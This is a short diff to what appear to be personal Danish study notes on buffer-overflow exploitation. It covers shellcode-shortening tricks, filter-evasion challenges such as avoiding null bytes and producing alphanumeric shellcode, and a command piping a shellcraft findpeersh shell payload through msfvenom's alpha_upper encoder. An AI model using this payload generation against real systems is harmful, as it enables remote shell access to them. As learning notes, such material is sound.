@@ -27,3 +27,11 @@ Overskriv retur adresse med 10 bytes så man skal lave en 'jmp -100' for at ramm
 Tricks til kortere shellcode:
 Nulstil eax, edx og ebx: 'xor ebx, ebx ; mul ebx'
 Nulstil eax og edx: 'xor eax, eax ; cdq'
+
+Udfordringer:
+    * copy printable
+    * avoid '&', ' ', '\r', '\n', '\0'
+    * copy alpha_mixed
+
+shellcraft i386.linux.findpeersh | msfvenom --encoder x86/alpha_upper --arch x86 --platform linux BufferRegister=EAX
+
